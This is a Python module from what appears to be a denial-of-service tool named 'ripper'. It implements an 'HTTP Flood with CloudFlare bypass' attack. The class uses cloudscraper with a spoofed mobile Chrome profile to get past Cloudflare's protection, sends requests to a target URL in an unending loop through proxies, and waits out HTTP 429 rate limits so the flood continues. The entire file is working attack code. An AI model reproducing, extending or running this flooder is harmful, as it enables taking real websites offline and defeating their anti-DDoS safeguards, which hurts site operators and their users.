import time
from contextlib import suppress

from cloudscraper import CloudScraper, create_scraper
from requests import Response

from ripper.actions.http_flood import HttpFlood
from ripper.context.target import Target
from ripper.context.events_journal import EventsJournal

# Forward Reference
Context = 'Context'

Events = EventsJournal()


class RateLimitException(BaseException):
    """Exception raised for rate limit response."""

    message: str
    """Description of the error"""

    def __init__(self, message: str):
        self.message = message
        super().__init__(self.message)

    def __str__(self):
        return f'CODE 429: {self.message}'


class HttpBypass(HttpFlood):
    """HTTP Flood method with CloudFlare bypass ."""

    name: str = 'HTTP Flood with CloudFlare bypass'
    label: str = 'http-bypass'

    _http_connect: CloudScraper = None

    def __init__(self, target: Target, context: Context):
        super().__init__(target, context)

    def __call__(self, *args, **kwargs):
        browser = {
            'browser': 'chrome',
            'platform': 'android',
            'desktop': False
        }
        with suppress(Exception), create_scraper(browser=browser) as self._http_connect:
            self._ctx.target.statistic.connect.status_success()
            Events.info('Creating CloudFlare scraper connection.')
            while self.send(self._http_connect):
                if self._ctx.dry_run:
                    break
                continue
            self._ctx.target.statistic.connect.status_failed()

    def send(self, scraper: CloudScraper):
        try:
            with scraper.get(self._target.url(),
                             headers=self._ctx.headers_provider.headers,
                             proxies=self._proxy) as response:
                self._ctx.target.statistic.http_stats[response.status_code] += 1
                self.check_rate_limit(response)
        except RateLimitException as e:
            Events.warn(f'{type(e).__name__} {e.__str__()}')
            time.sleep(3.01)
            return True
        except Exception as e:
            Events.exception(e)
        else:
            sent_bytes = self._size_of_request(response.request)
            self._ctx.target.statistic.packets.status_sent(sent_bytes)
            self._proxy.report_success() if self._proxy is not None else 0
            return True
        return False

    @staticmethod
    def check_rate_limit(response: Response):
        """Check status code for Rate limits applied and throws exception."""
        if response.status_code == 429:
            raise RateLimitException(response.reason)

    @staticmethod
    def _size_of_request(request) -> int:
        size: int = len(request.method) +\
                    len(request.url) + \
                    len('\r\n'.join(f'{k}: {v}' for k, v in request.headers.items()))
        return size
